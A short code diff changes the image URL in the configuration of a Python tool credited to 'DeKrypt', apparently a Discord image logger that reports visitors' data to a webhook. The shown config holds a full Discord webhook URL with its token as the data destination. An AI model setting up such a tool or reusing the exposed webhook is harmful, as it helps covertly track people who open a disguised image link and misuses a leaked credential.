@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1349521644472897536/21W8cutZHXzCU3wEfPjbKLfMqyibVvIDXzy9kgyXO_v7_wbGF2Wlgh4L7e_tAKB7EVtv",
-    "image": "https://tenor.com/view/haha-scammer-ha-ha-scammer-gif-9831250664566870502",
+    "image": "https://pasteboard.co/11ZC7k2IdEVO.jpg",
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
